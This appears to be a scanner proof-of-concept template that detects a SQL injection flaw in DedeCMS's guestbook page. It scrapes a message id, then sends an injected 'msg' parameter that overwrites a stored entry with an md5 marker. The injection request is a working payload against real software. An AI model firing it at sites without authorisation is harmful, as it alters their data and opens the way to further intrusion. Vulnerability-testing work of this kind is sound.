id: dedecms-guestbook-sqli

info:
    name: DEDECMS Guestbook sqli
    author: harris2015(https://github.com/harris2015)
    severity: high

set:
    r: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            method: GET
            path: /plus/guestbook.php
            follow_redirects: true
        expression: response.status == 200
        output:
            search: '"action=admin&id=(?P<articleid>\\d{1,20})".bsubmatch(response.body)'
            articleid: search["articleid"]
    r1:
        request:
            method: GET
            path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5({{r}})),email='
            follow_redirects: true
        expression: response.status == 200
    r2:
        request:
            method: GET
            path: /plus/guestbook.php
            follow_redirects: true
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
expression: r0() && r1() && r2()
